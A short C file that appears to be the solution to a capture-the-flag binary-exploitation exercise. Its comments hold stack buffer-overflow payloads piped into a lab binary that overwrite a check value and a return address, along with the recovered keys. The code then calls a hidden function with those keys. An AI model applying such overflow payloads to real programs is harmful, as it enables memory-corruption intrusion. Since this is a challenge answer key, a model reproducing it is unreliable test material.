#include <stdio.h>

int main () {
    /* call hidden function from object.o with the "key1 key2" argument */
    // key1 : python -c 'print "A" * 64 +  "\xbe\xba\xfe\xca" ' | ./attack
    // adrs vuln : 08 04 93 18
    // key2 : python -c 'print "A" * 64 +  "\xbe\xba\xfe\xca" +
    // 8 * "B" + "\x18\x93\x04\x08" ' | ./attack
    // key1 : you shall not pass
    // key2 : or maybe you should
    my_precious("you shall not pass or maybe you should", 0xb16b00b5);
    return 0;
}
